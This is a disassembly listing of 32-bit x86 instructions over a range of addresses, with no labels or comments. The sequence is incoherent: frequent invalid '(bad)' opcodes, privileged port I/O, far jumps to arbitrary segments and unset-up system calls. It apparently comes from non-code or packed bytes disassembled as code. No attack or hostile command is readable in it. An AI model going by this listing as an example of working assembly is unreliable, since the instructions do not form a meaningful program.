  40d753:	pop    DWORD PTR [eax+0x2c]
  40d756:	cmp    dl,BYTE PTR [edi-0xbf8c801]
  40d75c:	add    ah,BYTE PTR [ebx+0x59ccc65c]
  40d762:	(bad)  
  40d763:	cmp    eax,0x7b1de0a6
  40d768:	push   cs
  40d769:	adc    al,0xec
  40d76b:	out    dx,al
  40d76c:	loop   0x40d7b8
  40d76e:	or     eax,0x52a740e6
  40d773:	and    DWORD PTR [esi+0x65cc3cff],0xcd434dc6
  40d77d:	lds    ebx,FWORD PTR [edi-0x17]
  40d780:	(bad)  
  40d782:	jp     0x40d712
  40d784:	mov    eax,ds:0x12aca669
  40d789:	in     al,dx
  40d78a:	pop    es
  40d78b:	xor    BYTE PTR [ecx+0x23],cl
  40d78e:	push   ebx
  40d78f:	add    BYTE PTR [ebx-0x55],bh
  40d792:	mov    eax,ds:0xe17ba517
  40d797:	es xchg esp,eax
  40d799:	and    DWORD PTR [edi-0xa334202],edx
  40d79f:	pop    esi
  40d7a0:	adc    edx,DWORD PTR [edi-0x51]
  40d7a3:	inc    esp
  40d7a4:	mov    ch,0x30
  40d7a6:	sbb    DWORD PTR [esi+0x2b4eb780],ebx
  40d7ac:	in     al,0xe4
  40d7ae:	xchg   ecx,eax
  40d7af:	mov    al,ds:0xf877b7de
  40d7b4:	das    
  40d7b5:	push   esp
  40d7b6:	jle    0x40d7d5
  40d7b8:	xchg   DWORD PTR [ebp-0x76],edx
  40d7bb:	btc    DWORD PTR [ebx+edx*2-0x45],0x46
  40d7c1:	nop
  40d7c2:	rol    DWORD PTR [ebx-0x157bffaf],1
  40d7c8:	jnp    0x40d75b
  40d7ca:	pop    edx
  40d7cb:	addr16 push edx
  40d7cd:	mov    eax,ds:0x332c073e
  40d7d2:	jb     0x40d799
  40d7d4:	inc    ebp
  40d7d5:	rcl    eax,0x60
  40d7d8:	dec    edx
  40d7d9:	mov    edi,0x3b4d15f4
  40d7de:	sbb    al,0xe8
  40d7e0:	enter  0x6c58,0xd9
  40d7e4:	into   
  40d7e5:	adc    bl,0xb2
  40d7e8:	xchg   BYTE PTR [ebx+ecx*1+0x71fda702],bh
  40d7ef:	lods   al,BYTE PTR ds:[esi]
  40d7f0:	jb     0x40d83d
  40d7f2:	push   0xffffffb7
  40d7f4:	rcl    DWORD PTR [edx+ebx*2-0x750bcf8a],1
  40d7fb:	inc    edi
  40d7fc:	mov    BYTE PTR [edx-0x70],al
  40d7ff:	sub    eax,0x2af9d2b2
  40d804:	mov    ecx,0x1b24643b
  40d809:	mov    dh,0xe3
  40d80b:	ins    BYTE PTR es:[edi],dx
  40d80c:	and    ah,BYTE PTR [ebx]
  40d80e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d80f:	aam    0x4
  40d811:	mov    ebp,0x2c269a35
  40d816:	and    DWORD PTR [esi-0x55],eax
  40d819:	inc    edx
  40d81a:	xchg   esi,eax
  40d81b:	in     eax,0xf9
  40d81d:	test   DWORD PTR [edi+0x35d64cec],eax
  40d823:	cmp    al,0x26
  40d825:	psllw  mm4,QWORD PTR [ebx-0x1]
  40d829:	sbb    DWORD PTR [edi+0x51],esi
  40d82c:	sar    dl,1
  40d82e:	mov    ax,0x3e8
  40d832:	push   edx
  40d833:	in     al,dx
  40d834:	lds    eax,FWORD PTR [eax-0x3a]
  40d837:	or     eax,0x7afc5416
  40d83c:	inc    ebx
  40d83d:	inc    edx
  40d83e:	jae    0x40d7f3
  40d840:	push   ebp
  40d841:	daa    
  40d842:	iret   
  40d843:	or     al,0x28
  40d845:	shl    BYTE PTR [ebx-0x4e],0x47
  40d849:	pop    ebp
  40d84a:	dec    edx
  40d84b:	pop    es
  40d84c:	in     al,0xd8
  40d84e:	pop    ebp
  40d84f:	dec    ebp
  40d850:	xor    ah,BYTE PTR [edx+0x7e8e9675]
  40d856:	dec    edx
  40d857:	aas    
  40d858:	mov    eax,ds:0xa79b4500
  40d85d:	retf   
  40d85e:	sbb    ah,dl
  40d860:	rcl    dh,1
  40d862:	cmp    eax,0xd2e93350
  40d867:	jno    0x40d820
  40d869:	cdq    
  40d86a:	loope  0x40d8b5
  40d86c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d86d:	aas    
  40d86e:	shr    ebp,0xb3
  40d871:	mov    dh,0x26
  40d873:	xor    eax,0x1243de50
  40d878:	out    dx,al
  40d879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d87a:	cmp    dh,BYTE PTR [eax]
  40d87c:	pop    ss
  40d87d:	sti    
  40d87e:	imul   esi,DWORD PTR [esi-0x42],0xffffff9a
  40d882:	adc    DWORD PTR [ecx+0x6c81846d],esi
  40d888:	sti    
  40d889:	test   eax,0xe31c8d7a
  40d88e:	push   0xffffff8c
  40d890:	jbe    0x40d8ce
  40d892:	int3   
  40d893:	pop    es
  40d894:	sub    ah,dh
  40d896:	push   0x9d8efa5e
  40d89b:	push   0xa5659f9c
  40d8a0:	dec    esp
  40d8a1:	loop   0x40d8e1
  40d8a3:	mov    dh,0x1d
  40d8a5:	fs jo  0x40d8da
  40d8a8:	(bad)  
  40d8a9:	cmc    
  40d8aa:	cmp    eax,0x8810ac3b
  40d8af:	mov    ebx,0x73141ff3
  40d8b4:	popf   
  40d8b5:	mov    bh,0xef
  40d8b7:	sub    DWORD PTR [eax],esi
  40d8b9:	and    BYTE PTR [esi+0x14],dh
  40d8bc:	xchg   ebp,eax
  40d8bd:	mov    esi,0x7f258f70
  40d8c2:	jo     0x40d857
  40d8c4:	jmp    0xf181540
  40d8c9:	in     eax,0x2c
  40d8cb:	cmp    esp,DWORD PTR [ebx-0x4b]
  40d8ce:	test   BYTE PTR [eax],al
  40d8d0:	or     BYTE PTR [esi-0x435500],cl
  40d8d6:	or     BYTE PTR [ebp+ecx*2-0x1cd750d0],ah
  40d8dd:	and    ebx,DWORD PTR [edi-0x24]
  40d8e0:	sub    al,bl
  40d8e2:	mov    edx,DWORD PTR [edx]
  40d8e4:	pop    esi
  40d8e5:	adc    DWORD PTR [ebx-0x62],esp
  40d8e8:	cld    
  40d8e9:	retf   
  40d8ea:	sbb    DWORD PTR [bx+si-0x60d3],edi
  40d8ef:	jmp    0x9db8:0xa4d943ee
  40d8f6:	icebp  
  40d8f7:	lods   al,BYTE PTR ds:[esi]
  40d8f8:	adc    BYTE PTR [edx],bl
  40d8fa:	inc    esi
  40d8fb:	push   edi
  40d8fc:	sub    al,0xe1
  40d8fe:	nop
  40d8ff:	jae    0x40d911
  40d901:	pop    edx
  40d902:	das    
  40d903:	sar    BYTE PTR [ebx+0x40],0x37
  40d907:	je     0x40d897
  40d909:	jbe    0x40d8a3
  40d90b:	fstp   DWORD PTR [edi+0x20]
  40d90e:	cmp    esi,ebx
  40d910:	int    0xd2
  40d912:	mov    dh,0x15
  40d914:	cmp    ecx,DWORD PTR [edi]
  40d916:	cmp    DWORD PTR [edx-0x393143c8],0x850cb72
  40d920:	ret    
  40d921:	daa    
  40d922:	xchg   ebp,eax
  40d923:	ficom  WORD PTR [edx+esi*4+0x448c9089]
  40d92a:	xchg   ebx,eax
  40d92b:	or     eax,0xa5d8cf03
  40d930:	(bad)  [edx]
  40d932:	xchg   ecx,eax
  40d933:	mov    edi,0x205fe61f
  40d938:	mov    eax,ds:0xa5e2fbe3
  40d93d:	(bad)  
  40d93e:	and    al,0xe8
  40d940:	dec    edi
  40d941:	dec    ebp
  40d942:	sub    bl,al
  40d944:	shr    bh,0x63
  40d947:	lods   al,BYTE PTR ds:[esi]
  40d948:	push   ebp
  40d949:	int3   
  40d94a:	add    edi,DWORD PTR [ecx+edi*1+0x48]
  40d94e:	sub    eax,0xdae93862
  40d953:	xor    al,0xa1
  40d955:	xchg   esi,eax
  40d956:	push   esi
  40d957:	mov    ah,0xf
  40d959:	(bad)
  40d95c:	mov    WORD PTR [edi+0xa220950],fs
  40d962:	das    
  40d963:	sbb    al,0xfc
  40d965:	stos   DWORD PTR es:[edi],eax
  40d966:	fisttp DWORD PTR [esi-0x5adcf901]
  40d96c:	push   eax
  40d96d:	ds js  0x40d9cd
  40d970:	pushf  
  40d971:	stc    
  40d972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d973:	mov    dh,0xcc
  40d975:	loop   0x40d965
  40d977:	std    
  40d978:	jns    0x40d9c7
  40d97a:	call   0xf180:0x2e7dab37
  40d981:	push   eax
  40d982:	call   0x7295:0x82ef44f4
  40d989:	inc    ebx
  40d98a:	mov    ecx,0x5032383
  40d98f:	add    cl,bl
  40d991:	xor    al,0x9f
  40d993:	xor    dh,ah
  40d995:	mov    edi,0xcf73a734
  40d99a:	and    eax,0x4b7b3ce5
  40d99f:	xlat   BYTE PTR ds:[ebx]
  40d9a0:	enter  0x4ef2,0xdc
  40d9a4:	dec    edi
  40d9a5:	mov    dh,0x5d
  40d9a7:	sub    dh,dh
  40d9a9:	test   BYTE PTR [edx+0x1b3f64da],cl
  40d9af:	pop    es
  40d9b0:	lods   al,BYTE PTR ds:[esi]
  40d9b1:	stc    
  40d9b2:	shl    esp,1
  40d9b4:	dec    ecx
  40d9b5:	sbb    eax,0xe180d6cd
  40d9ba:	ret    
  40d9bb:	js     0x40da0f
  40d9bd:	sub    ch,BYTE PTR [esi-0x51b0f52e]
  40d9c3:	popf   
  40d9c4:	push   ss
  40d9c5:	xchg   ecx,eax
  40d9c6:	xor    al,0x97
  40d9c8:	add    DWORD PTR [edi+edx*8+0x2c],0x1b48be66
  40d9d0:	jb     0x40d962
  40d9d2:	mov    ch,0x90
  40d9d4:	add    cl,BYTE PTR [ebx]
  40d9d6:	lock std 
  40d9d8:	pop    ebx
  40d9d9:	fisttp DWORD PTR [ecx+esi*1-0x71d06cd2]
  40d9e0:	jmp    0x40d9de
  40d9e2:	(bad)  
  40d9e3:	jp     0x40da1f
  40d9e5:	adc    al,0xb1
  40d9e7:	jmp    0x1502cd77
  40d9ec:	adc    DWORD PTR [esi-0x7e],esi
  40d9ef:	ffree  st(4)
  40d9f1:	inc    ebx
  40d9f2:	das    
  40d9f3:	leave  
  40d9f4:	cmp    eax,0xe7f4ca36
  40d9f9:	syscall 
  40d9fb:	sub    al,0x77
  40d9fd:	shr    bl,cl
  40d9ff:	ret    0x577e
  40da02:	test   DWORD PTR [edx-0x26],eax
  40da05:	scas   al,BYTE PTR es:[edi]
  40da06:	fsubrp st(0),st
  40da08:	jb     0x40d9e2
  40da0a:	iret   
  40da0b:	fst    DWORD PTR [edx]
  40da0d:	add    ecx,eax
  40da0f:	rcl    ebp,cl
  40da11:	mov    ebp,0x65856db
  40da16:	inc    ebp
  40da17:	icebp  
  40da18:	mov    edx,0xf4fc6369
  40da1d:	stos   BYTE PTR es:[edi],al
  40da1e:	xchg   edx,eax
  40da1f:	aas    
  40da20:	inc    eax
  40da21:	mov    cs,edi
  40da23:	lods   eax,DWORD PTR ds:[esi]
  40da24:	and    eax,0xf6290196
  40da29:	xchg   esp,eax
  40da2a:	mov    si,0xc470
  40da2e:	adc    eax,0x85e7d11
  40da33:	cmp    cl,BYTE PTR [esi]
  40da35:	out    0x51,eax
  40da37:	inc    esi
  40da38:	xchg   edx,eax
  40da39:	push   edx
  40da3a:	dec    edi
  40da3b:	mov    ds:0x568e6cca,eax
  40da40:	push   ebp
  40da41:	imul   esp,DWORD PTR [esi+0x33],0xefb44b11
  40da48:	mov    WORD PTR [ecx-0x5f691b70],gs
  40da4e:	cdq    
  40da4f:	arpl   WORD PTR [ecx-0x1dd33c5e],bx
  40da55:	scas   eax,DWORD PTR es:[edi]
  40da56:	cmp    eax,0x6128dc75
  40da5b:	sub    esi,DWORD PTR [ebx-0x19c0e9da]
  40da61:	cmp    BYTE PTR [eax],cl
  40da63:	inc    esi
  40da64:	rcl    DWORD PTR [edx+edx*4],0xfa
  40da68:	push   ss
  40da69:	imul   edi,ebx,0xbfcfdf84
  40da6f:	ja     0x40dab5
  40da71:	daa    
  40da72:	gs out 0xda,al
  40da75:	(bad)  
  40da76:	mov    ah,0x23
  40da78:	(bad)
  40da7b:	mov    edi,0x6aa547be
  40da80:	sub    al,0xf6
  40da82:	dec    eax
  40da83:	lods   eax,DWORD PTR es:[esi]
  40da85:	ja     0x40da28
  40da87:	fild   DWORD PTR [ebp-0x7b376035]
  40da8d:	test   ah,bh
  40da8f:	cmc    
  40da90:	aad    0xba
  40da92:	fld    DWORD PTR [esi+edx*4-0x77]
  40da96:	out    0x21,al
  40da98:	jp     0x40daa1
  40da9a:	adc    ah,ch
  40da9c:	icebp  
  40da9d:	fld    QWORD PTR ds:0xec136639
  40daa3:	es xchg edx,eax
  40daa5:	push   esp
  40daa6:	loop   0x40db0a
  40daa8:	ja     0x40dab5
  40daaa:	push   ebp
  40daab:	push   esi
  40daac:	xchg   esi,eax
  40daad:	push   cs
  40daae:	mov    dl,0x13
  40dab0:	std    
  40dab1:	lods   al,BYTE PTR ds:[esi]
  40dab2:	pop    ebp
  40dab3:	ja     0x40daff
  40dab5:	out    0x1a,eax
  40dab7:	or     eax,0xb732b11c
  40dabc:	cmp    DWORD PTR [ecx+0x44],0xf5388ec0
  40dac3:	xchg   ecx,eax
  40dac4:	cmc    
  40dac5:	push   ss
  40dac6:	dec    ebx
  40dac7:	xor    DWORD PTR [ebx-0x49],ebx
  40daca:	shr    BYTE PTR [ecx+eiz*2+0x23],0x37
  40dacf:	push   ecx
  40dad0:	jmp    0xda54456b
  40dad5:	xchg   edx,eax
  40dad6:	add    bl,BYTE PTR [ebp+0x5b]
  40dad9:	jae    0x40da8b
  40dadb:	pop    ebp
  40dadc:	sbb    BYTE PTR [edx],ah
  40dade:	sub    DWORD PTR [esi+0x7f85d182],eax
  40dae4:	push   eax
  40dae5:	in     al,dx
  40dae6:	mov    ds:0x9007b151,al
  40daeb:	cs adc dh,dh
  40daee:	aas    
  40daef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daf0:	out    0x87,eax
  40daf2:	outs   dx,DWORD PTR ds:[esi]
  40daf3:	mov    BYTE PTR [esi+0x1a],bl
  40daf6:	mov    eax,0x9de64505
  40dafb:	mov    cl,0xb8
  40dafd:	enter  0x3b57,0x6f
  40db01:	sbb    BYTE PTR [eax-0x37],bh
  40db04:	mov    cl,0xb0
  40db06:	push   ds
  40db07:	stos   BYTE PTR es:[edi],al
  40db08:	cli    
  40db09:	mov    edi,0xdcdafd48
  40db0e:	sar    DWORD PTR [ecx-0xe],cl
  40db11:	lods   eax,DWORD PTR ds:[esi]
  40db12:	xor    al,0x6b
  40db14:	add    BYTE PTR [ebx+0x21],dh
  40db17:	sub    BYTE PTR [ebp-0x6e454a77],ah
  40db1d:	fistp  WORD PTR fs:[ebp+ebx*2-0x59]
  40db22:	jp     0x40db28
  40db24:	les    eax,FWORD PTR [ecx]
  40db26:	les    edi,FWORD PTR [edi+0x713a82b4]
  40db2c:	and    DWORD PTR [ebx+0x3d783e24],edx
  40db32:	repz push ds
  40db34:	mov    al,0x5b
  40db36:	sti    
  40db37:	fsubrp st(6),st
  40db39:	cmp    BYTE PTR [ebp+0x3aac4cbc],dl
  40db3f:	and    DWORD PTR [edi],edx
  40db41:	and    ah,bh
  40db43:	sub    eax,0x28ed4fc1
  40db48:	mov    cl,0xaf
  40db4a:	xchg   BYTE PTR [edx-0x2f],dl
  40db4d:	xchg   ebp,eax
  40db4e:	mov    ah,0x85
  40db50:	rcr    DWORD PTR [ebp+0x8],1
  40db53:	inc    esp
  40db54:	fnstsw WORD PTR [esi]
  40db56:	push   ebp
  40db57:	push   ds
  40db58:	xchg   edi,eax
  40db59:	aas    
  40db5a:	and    DWORD PTR [ebp+0x668402bf],edx
  40db60:	rol    BYTE PTR [ebp+0x5cbdc4a],1
  40db66:	inc    BYTE PTR [ebx]
  40db68:	(bad)  
  40db69:	pop    ebx
  40db6a:	mov    bh,0xb7
  40db6c:	out    0x1c,eax
  40db6e:	or     DWORD PTR [ecx],0x5fb9672c
  40db74:	xchg   ebp,eax
  40db75:	push   ss
  40db76:	cwde   
  40db77:	out    dx,eax
  40db78:	(bad)
  40db7b:	test   edx,edi
  40db7d:	sbb    esi,DWORD PTR [ebp+0x57aeaf2c]
  40db83:	sub    al,0xa0
  40db85:	sbb    al,0x84
  40db88:	dec    edx
  40db89:	push   ds
  40db8a:	cmc    
  40db8b:	es gs retf 
  40db8e:	mov    cl,0x6f
  40db90:	test   DWORD PTR [ebx-0x5f7fa413],esp
  40db96:	addr16 jns 0x40db86
  40db99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db9a:	gs add eax,0x14b6ad54
  40dba0:	les    esp,FWORD PTR [edi-0xa3aeb45]
  40dba6:	push   edx
  40dba7:	add    BYTE PTR [esi],dh
  40dba9:	mov    dh,0x6c
  40dbab:	adc    DWORD PTR [edi],edi
  40dbad:	mov    bh,BYTE PTR [esi-0x66b721]
  40dbb3:	lahf   
  40dbb4:	call   0x28924455
  40dbb9:	cmp    BYTE PTR [ebx-0x1d],dh
  40dbbc:	loop   0x40db69
  40dbbe:	loope  0x40dbe7
  40dbc0:	xchg   BYTE PTR [edi],ah
  40dbc2:	mov    ebx,0x6bf592b7
  40dbc7:	jnp    0x40dbd4
  40dbc9:	cdq    
  40dbca:	inc    bl
  40dbcc:	xor    al,0xf
  40dbce:	jno    0x40db80
  40dbd0:	xor    eax,0xd1160dcd
  40dbd5:	int3   
  40dbd6:	fisub  WORD PTR ds:0x715343ce
  40dbdc:	or     edx,DWORD PTR [ecx*4+0x1306fb66]
  40dbe3:	cmp    eax,esi
  40dbe5:	out    dx,eax
  40dbe6:	push   cs
  40dbe7:	jl     0x40dbbf
  40dbe9:	pop    ebx
  40dbea:	ret    
  40dbeb:	imul   ebp,DWORD PTR [di+0x58fc],0x9
  40dbf1:	stos   DWORD PTR es:[edi],eax
  40dbf2:	dec    ebx
  40dbf3:	ds es pop edx
  40dbf6:	and    DWORD PTR [eax+0x36dd47c5],ebx
  40dbfc:	fistp  WORD PTR [eax-0x4e]
  40dbff:	js     0x40dba2
  40dc01:	jmp    0x1ae016b9
  40dc06:	call   0x24f8986c
  40dc0b:	inc    esi
  40dc0c:	dec    ecx
  40dc0d:	sar    BYTE PTR [ebp-0x59],0xd5
  40dc11:	repz cmp al,0xc9
  40dc14:	icebp  
  40dc15:	bswap  eax
  40dc17:	(bad)  
  40dc18:	jecxz  0x40dc21
  40dc1a:	outs   dx,BYTE PTR ds:[esi]
  40dc1b:	mov    ch,0x45
  40dc1d:	xchg   esi,esp
  40dc1f:	ret    
  40dc20:	mov    bh,0xc7
  40dc22:	scas   eax,DWORD PTR es:[edi]
  40dc23:	imul   esi,esp,0x8bbb07fa
  40dc29:	neg    DWORD PTR [edi-0x7062bd76]
  40dc2f:	arpl   bx,bp
  40dc31:	adc    ebp,DWORD PTR [ecx-0x39a70b5d]
  40dc37:	mov    eax,0xad5a4724
  40dc3c:	dec    eax
  40dc3d:	shl    cl,0xfa
  40dc40:	outs   dx,BYTE PTR ds:[esi]
  40dc41:	pop    ebp
  40dc42:	add    DWORD PTR [ebp-0x52],esi
  40dc45:	les    ecx,FWORD PTR [esi+eiz*8]
  40dc48:	xor    BYTE PTR [ebx+edi*8],dh
  40dc4b:	lock das 
  40dc4d:	(bad)  [eax-0x6f]
  40dc50:	in     al,0xd0
  40dc52:	imul   ebp,DWORD PTR [edx-0x41bae4f9],0x41e7248b
  40dc5c:	sbb    BYTE PTR [edi+0x76],al
  40dc5f:	mov    ah,0x6
  40dc61:	add    al,0x7f
  40dc63:	mov    ebp,0xd596772d
  40dc68:	imul   ebp,edx,0x29
  40dc6b:	or     eax,0xc564ee04
  40dc70:	jle    0x40dcab
  40dc72:	push   ecx
  40dc73:	jg     0x40dbfd
  40dc75:	leave  
  40dc76:	shl    DWORD PTR fs:[eax+0x250bcfea],1
  40dc7d:	fcmovu st,st(2)
  40dc7f:	pop    esi
  40dc80:	dec    ebp
  40dc81:	adc    eax,0xb31215ed
  40dc86:	xchg   ebp,eax
  40dc87:	pop    ebx
  40dc88:	mov    dl,0x96
  40dc8a:	popa   
  40dc8b:	shr    DWORD PTR [edx-0x7],1
  40dc8e:	push   esp
  40dc8f:	jmp    0xcf4c539b
  40dc94:	or     al,0x5f
  40dc96:	fadd   DWORD PTR [edx-0xddef674]
  40dc9c:	in     al,0x9b
  40dc9e:	add    ecx,DWORD PTR [ecx+0x1]
  40dca1:	xchg   BYTE PTR [edi+0xc],bl
  40dca4:	cli    
  40dca5:	test   dh,cl
  40dca7:	push   0xffffffb4
  40dca9:	fistp  QWORD PTR [edi]
  40dcab:	mov    ch,BYTE PTR [edx]
  40dcad:	cld    
  40dcae:	pop    esp
  40dcaf:	sub    BYTE PTR [esi-0x359979d6],ah
  40dcb5:	aaa    
  40dcb6:	lock fist DWORD PTR [esi+0x50]
  40dcba:	add    BYTE PTR [ecx+eax*2],bl
  40dcbd:	adc    bl,BYTE PTR fs:[ecx+0x242399b7]
  40dcc4:	(bad)  
  40dcc5:	mov    eax,0x671a2606
  40dcca:	lds    esi,FWORD PTR [edi]
  40dccc:	(bad)  
  40dccd:	adc    al,0x89
  40dccf:	push   eax
  40dcd0:	pop    edi
  40dcd1:	fdiv   QWORD PTR [ebx-0x4f]
  40dcd4:	popf   
  40dcd5:	cld    
  40dcd6:	mov    al,0xc2
  40dcd8:	or     bl,bh
  40dcda:	xchg   edx,eax
  40dcdb:	ret    
  40dcdc:	retf   0xe2de
  40dcdf:	mov    eax,0x4b2a7164
  40dce4:	jge    0x40dcbe
  40dce6:	xchg   ebp,eax
  40dce7:	cwde   
  40dce8:	in     eax,0x90
  40dcea:	mov    ds:0x94d888f8,al
  40dcef:	jno    0x40dd51
  40dcf1:	aad    0x87
  40dcf3:	pop    es
  40dcf4:	pusha  
  40dcf5:	adc    BYTE PTR fs:[edx+0x7f5e5698],ah
  40dcfc:	dec    esi
  40dcfd:	cmp    BYTE PTR [edi+0x74],ah
  40dd00:	lods   eax,DWORD PTR ds:[esi]
  40dd01:	add    esi,DWORD PTR [ebp+edx*2-0x2f]
  40dd05:	sub    bl,BYTE PTR [edx-0x48267891]
  40dd0b:	inc    ebp
  40dd0c:	ja     0x40dc8e
  40dd0e:	bnd ss jl 0x40dd2c
  40dd12:	jl     0x40dd22
  40dd14:	aam    0xe4
  40dd16:	dec    edi
  40dd17:	mov    ch,0xb0
  40dd19:	or     BYTE PTR [esi],ah
  40dd1b:	aaa    
  40dd1c:	pop    edx
  40dd1d:	mov    BYTE PTR [edi-0x543b818],al
  40dd23:	sbb    al,0x9a
  40dd25:	jae    0x40dd77
  40dd27:	xchg   edi,eax
  40dd28:	rcr    DWORD PTR [ebx],1
  40dd2a:	push   ds
  40dd2b:	mov    ss,ecx
  40dd2d:	ins    BYTE PTR es:[edi],dx
  40dd2e:	dec    ecx
  40dd2f:	repz xor BYTE PTR [ebp+0x6d9a4977],0xe2
  40dd37:	es ins BYTE PTR es:[edi],dx
  40dd39:	push   edi
  40dd3a:	push   ebp
  40dd3b:	jns    0x40dd6a
  40dd3d:	outs   dx,BYTE PTR ds:[esi]
  40dd3e:	inc    eax
  40dd3f:	js     0x40dd13
  40dd41:	mov    dl,0x53
  40dd43:	add    bl,BYTE PTR [ebx+esi*2+0x3a]
  40dd47:	cld    
  40dd48:	mov    eax,ds:0x1a5a746f
  40dd4d:	xor    BYTE PTR [esi],bl
  40dd4f:	mov    al,dh
  40dd51:	fist   WORD PTR [ecx]
  40dd53:	call   0x5e56fa03
  40dd58:	jbe    0x40ddd1
  40dd5a:	in     eax,dx
  40dd5b:	mov    dh,BYTE PTR fs:[edi]
  40dd5e:	(bad)  
  40dd5f:	mov    dl,bl
  40dd61:	jge    0x40ddd1
  40dd63:	(bad)  
  40dd64:	mov    ebx,0x91357a4c
  40dd69:	ret    
  40dd6a:	je     0x40dcf0
  40dd6c:	ss or  al,0xb4
  40dd6f:	or     ecx,DWORD PTR fs:[edx-0x24]
  40dd73:	rcr    edi,cl
  40dd75:	xchg   BYTE PTR [ecx*2+0xe4cafe0],dh
  40dd7c:	out    dx,eax
  40dd7d:	push   edx
  40dd7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd7f:	pop    edx
  40dd80:	jns    0x40ddbe
  40dd82:	or     DWORD PTR [ebp+0x6],ecx
  40dd85:	sub    esp,DWORD PTR [edi]
  40dd87:	fdivr  DWORD PTR [edi-0x37b84528]
  40dd8d:	sub    ah,BYTE PTR [edx+0x73]
  40dd90:	in     eax,0x72
  40dd92:	js     0x40dd7f
  40dd94:	pop    ss
  40dd95:	add    dl,dh
  40dd97:	and    DWORD PTR [ebx],esi
  40dd99:	imul   ebx,DWORD PTR [edx+0x5c],0x6b
  40dd9d:	jne    0x40dddb
  40dd9f:	ret    0xbf6a
  40dda2:	inc    ebx
  40dda3:	call   0x5f3e6ac
  40dda8:	pop    ecx
  40dda9:	mov    ecx,0xcf10548e
  40ddae:	inc    ebx
  40ddaf:	jmp    0xbcb9:0x8ddc3d61
  40ddb6:	sub    BYTE PTR [edx-0x53],al
  40ddb9:	outs   dx,BYTE PTR ds:[esi]
  40ddba:	iret   
  40ddbb:	cmc    
  40ddbc:	xchg   BYTE PTR [ebp+0x490301c2],bl
  40ddc2:	enter  0x73fb,0x80
  40ddc6:	test   BYTE PTR ss:[eax-0x3c],0xe
  40ddcb:	push   esp
  40ddcc:	inc    edx
  40ddcd:	sbb    bl,BYTE PTR [ebx]
  40ddcf:	xchg   ecx,eax
  40ddd0:	lods   al,BYTE PTR ds:[esi]
  40ddd1:	and    al,0xfa
  40ddd3:	sbb    BYTE PTR [edx+esi*1],ch
  40ddd6:	xchg   BYTE PTR [ecx+0x771af309],dh
  40dddc:	enter  0x905e,0x83
  40dde0:	xor    DWORD PTR ds:0xcabc5efa,0x5
  40dde7:	stos   DWORD PTR es:[edi],eax
  40dde8:	xchg   edx,eax
  40dde9:	mov    ds:0x21e68f3f,al
  40ddee:	dec    dx
  40ddf0:	push   ds
  40ddf1:	push   0x38
  40ddf3:	or     edi,DWORD PTR [eax+0x4f8ee2cd]
  40ddf9:	push   cs
  40ddfa:	test   DWORD PTR [edx],esp
  40ddfc:	mov    ah,0x33
  40ddfe:	cmp    edx,esi
  40de00:	pop    edi
  40de01:	and    DWORD PTR [esi+ebx*8+0x6f],0xe93a248a
  40de09:	outs   dx,DWORD PTR ds:[esi]
  40de0a:	jl     0x40de0b
  40de0c:	test   al,0x4a
  40de0e:	(bad)  
  40de0f:	into   
  40de10:	mov    ebx,0xd60fe6e9
  40de15:	sbb    dl,dh
  40de17:	int    0x80
  40de19:	mul    ecx
  40de1b:	mov    bh,0x55
  40de1d:	xchg   ebp,eax
  40de1e:	pushf  
  40de1f:	les    ecx,FWORD PTR [edx+0x52f1823f]
  40de25:	sti    
  40de26:	sub    ch,BYTE PTR [ecx-0x4f05b815]
  40de2c:	add    ah,BYTE PTR [ebp+0xa711b25]
  40de32:	sub    eax,0xba95e1b7
  40de37:	loope  0x40de1e
  40de39:	xchg   DWORD PTR [edi],esp
  40de3b:	sub    bh,dl
  40de3d:	aaa    
  40de3e:	stos   DWORD PTR es:[edi],eax
  40de3f:	xchg   ebx,eax
  40de40:	repnz aas 
  40de42:	pusha  
  40de43:	add    BYTE PTR [eax-0x46],bl
  40de46:	or     DWORD PTR [eax+esi*8-0x8],edx
  40de4a:	xor    edi,DWORD PTR [edx+0x29]
  40de4d:	mov    bl,0xa5
  40de4f:	push   0xffffff95
  40de51:	xchg   al,ch
  40de53:	dec    ebx
  40de54:	sub    edx,eax
  40de56:	mov    edx,0xf8bd4134
  40de5b:	fs mov ebp,0x5aa9f144
  40de61:	adc    eax,ecx
  40de63:	jo     0x40de3d
  40de65:	mov    bh,BYTE PTR [eax]
  40de67:	mov    bl,0x2f
  40de69:	xchg   ecx,eax
  40de6a:	(bad)  
  40de6b:	out    dx,al
  40de6c:	popa   
  40de6d:	pop    esp
  40de6e:	adc    edi,DWORD PTR [edi-0x74408ac]
  40de74:	in     eax,0xa6
  40de76:	aad    0xed
  40de78:	in     eax,dx
  40de79:	repnz push esi
  40de7b:	pop    esi
  40de7c:	add    ah,bh
  40de7e:	adc    bh,BYTE PTR [eax-0x472d8ab5]
  40de84:	repz out dx,al
  40de86:	mov    esp,fs
  40de88:	cs mov edi,0xa09b6875
  40de8e:	(bad)  
  40de8f:	in     eax,0x20
  40de91:	ficomp DWORD PTR [esi+0x44d844cf]
  40de97:	mov    BYTE PTR [eax*4-0x6b1bc776],bh
  40de9e:	and    ebp,ecx
  40dea0:	push   esi
  40dea1:	in     eax,0x57
  40dea3:	retf   
  40dea4:	or     al,BYTE PTR [esi+0x68]
  40dea7:	mov    esi,0xcd777160
  40deac:	inc    ecx
  40dead:	fild   WORD PTR [eax+0x459d1f35]
  40deb3:	sbb    ch,BYTE PTR [ebx+0x17b96b98]
  40deb9:	lock adc BYTE PTR [ebx+0x62],al
  40debd:	mov    ch,0x46
  40debf:	mov    al,ds:0x9bdef886
  40dec4:	adc    eax,0xa713878a
  40dec9:	mov    DWORD PTR [ebx+eiz*4-0x6d970ce0],esi
  40ded0:	loop   0x40df22
  40ded2:	mov    cl,0xad
  40ded4:	rol    BYTE PTR [ebx-0x40],1
  40ded7:	das    
  40ded8:	in     al,0x68
  40deda:	xor    esp,DWORD PTR [ebx]
  40dedc:	mov    ch,BYTE PTR [esi-0x1d89c8d6]
  40dee2:	cld    
  40dee3:	pop    ebx
  40dee4:	loop   0x40deaa
  40dee6:	repz jmp 0x7880:0x25f79f74
  40deee:	addr16 loop 0x40ded8
  40def1:	sbb    ch,BYTE PTR [edi+0x32bf2c44]
